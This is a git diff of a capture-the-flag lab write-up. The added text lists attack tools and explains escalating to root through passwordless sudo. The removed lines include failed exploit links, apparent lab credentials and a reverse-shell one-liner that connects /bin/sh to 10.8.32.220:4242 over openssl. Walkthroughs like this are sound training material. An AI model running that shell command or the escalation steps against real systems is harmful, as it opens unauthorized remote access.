@@ -12,7 +12,9 @@ Tools Used:
 
 - Kali Linux
 - NMAP
-- 
+- gobuster
+- dirbuster
+- ncat
 
 
 ---
@@ -84,28 +86,14 @@ Tools Used:
 
     ![](img/picklerick12.png)
 
+8. Third Flag
 
-
-
-8. Privilege Escalation
-
-    uname -a:
+    Since we have a reverse shell access, let's try `sudo -l` to see if we have permissions on something:
 
     ![](img/picklerick13.png)
 
+    As we can see, we've got permissions on all commands without password.
 
-    Unsuccessfull attempts:
+    So let's use sudo to see the contents of user root home folder, and we can see the third flag:
 
-    https://www.exploit-db.com/exploits/41457 Not woking
-    https://www.exploit-db.com/exploits/47169 Not woking
-    https://www.exploit-db.com/exploits/44298 Not woking
-    
-
-
-
-
-
-R1ckRul3s
-Wubbalubbadubdub
-
-mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.8.32.220:4242 > /tmp/s; rm /tmp/s
+    ![](img/picklerick14.png)
